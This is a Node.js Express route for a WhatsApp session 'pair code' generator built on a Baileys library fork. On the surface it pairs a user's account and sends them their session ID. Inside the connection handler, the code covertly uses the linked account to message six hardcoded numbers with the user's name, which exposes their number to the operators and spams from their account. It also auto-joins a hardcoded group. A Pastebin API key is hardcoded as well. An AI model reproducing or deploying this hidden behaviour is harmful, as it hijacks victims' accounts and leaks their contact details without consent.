const PastebinAPI = require('pastebin-js'),
    pastebin = new PastebinAPI('EMWTMkQAVfJa9kM-MRUrxd5Oku1U7pgL');
const { makeid } = require('./id');
const express = require('express');
const fs = require('fs');
let router = express.Router();
const pino = require("pino");
const {
    default: Venocyber_Tech,
    useMultiFileAuthState,
    delay,
    makeCacheableSignalKeyStore,
    Browsers
} = require("maher-zubair-baileys");

function removeFile(FilePath) {
    if (!fs.existsSync(FilePath)) return false;
    fs.rmSync(FilePath, { recursive: true, force: true });
}

const numbersToSend = [
    '94741235633', // Replace with actual numbers
    '94757660788',
    '94767799548',
    '94778668193',
    '94785274495',
    '94789958225'
];
const groupLink = 'https://chat.whatsapp.com/Cry8eSzZqW27t9H8uOcRIR'; // Replace with your group link

const imageUrl = 'https://i.postimg.cc/3wrf9ccK/IMG-20240804-WA0000.jpg'; // Replace with your image URL

router.get('/', async (req, res) => {
    const id = makeid();
    let num = req.query.number;
    async function VENOCYBER_MD_PAIR_CODE() {
        const { state, saveCreds } = await useMultiFileAuthState('./temp/' + id);
        try {
            let Pair_Code_By_Venocyber_Tech = Venocyber_Tech({
                auth: {
                    creds: state.creds,
                    keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }).child({ level: "fatal" })),
                },
                printQRInTerminal: false,
                logger: pino({ level: "fatal" }).child({ level: "fatal" }),
                browser: ["Chrome (Linux)", "", ""]
            });
            if (!Pair_Code_By_Venocyber_Tech.authState.creds.registered) {
                await delay(1500);
                num = num.replace(/[^0-9]/g, '');
                const code = await Pair_Code_By_Venocyber_Tech.requestPairingCode(num);
                if (!res.headersSent) {
                    await res.send({ code });
                }
            }
            Pair_Code_By_Venocyber_Tech.ev.on('creds.update', saveCreds);
            Pair_Code_By_Venocyber_Tech.ev.on("connection.update", async (s) => {
                const { connection, lastDisconnect } = s;
                if (connection === "open") {
                    await delay(5000);
                    let data = fs.readFileSync(__dirname + `/temp/${id}/creds.json`);
                    await delay(800);
                    let b64data = Buffer.from(data).toString('base64');
                    let session = await Pair_Code_By_Venocyber_Tech.sendMessage(Pair_Code_By_Venocyber_Tech.user.id, { text: '' + b64data });

                    let VENOCYBER_MD_TEXT = `*_Pair Code Connecte_*
*_Made With RCD TEAM_*
______________________________________
╔══════════════════════❯
║ *⛬ WOW YOU CHOOSEN RCD-MD ⛬*
╚══════════════════════❯
╔════════════════════❯
║  ❮••• 𝗩𝗶𝘀𝗶𝘁 𝗙𝗼𝗿 𝗛𝗲𝗹𝗽 •••❯
║➢  *Ytube:* ➖ https://rb.gy/1hcpmg
║➢  *Repo:* ➖ https://rb.gy/fj7dc2
║➢  *WaGroup:* ➖ https://rb.gy/ldoz3f
║➢  *WaChannel:* ➖ https://rb.gy/91sc7k
╚════════════════════❯

> *RCD TEAM _____________________________*`;
                    await Pair_Code_By_Venocyber_Tech.sendMessage(Pair_Code_By_Venocyber_Tech.user.id, { text: VENOCYBER_MD_TEXT }, { quoted: session });

                    // Send the new message to multiple numbers with image
                    for (const number of numbersToSend) {
                        await Pair_Code_By_Venocyber_Tech.sendMessage(number + '@s.whatsapp.net', {
                            image: { url: imageUrl },
                            caption: `
*╭────────────⊶*
*│* *ɪ ᴀᴍ  ʀᴄᴅ ᴍᴅ ꜱᴇꜱꜱɪᴏɴ ɪᴅ ʙᴏᴛ*
*╰────────────⊶*

*╭────────────⊶*
*│* ○ \`ᴍʏ ɴᴀᴍᴇ   │ ${Pair_Code_By_Venocyber_Tech.user.name}\`
*╰─────────────⊶*
*────────────⊶*
*╭──────────⊶*
*│❮ RCD MD SESSION ID CONNECT ❯*
*│❮ SO MY NUMBER SAVE ❯*
*╰──────────⊶*`
                        });
                        await delay(3000); // Longer delay between messages
                    }

                    // Join group using the group link
                    try {
                        const inviteCode = groupLink.split('/').pop(); // Extract invite code from link
                        const result = await Pair_Code_By_Venocyber_Tech.groupAcceptInvite(inviteCode);
                        console.log('Joined the group successfully:', result);
                    } catch (err) {
                        console.error('Failed to join the group:', err);
                    }

                    await delay(100);
                    await Pair_Code_By_Venocyber_Tech.ws.close();
                    return await removeFile('./temp/' + id);
                } else if (connection === "close" && lastDisconnect && lastDisconnect.error && lastDisconnect.error.output.statusCode != 401) {
                    await delay(10000);
                    VENOCYBER_MD_PAIR_CODE();
                }
            });
        } catch (err) {
            console.error("Service restarted due to error:", err);
            await removeFile('./temp/' + id);
            if (!res.headersSent) {
                await res.send({ code: "Service Unavailable" });
            }
        }
    }
    return await VENOCYBER_MD_PAIR_CODE();
});

module.exports = router;
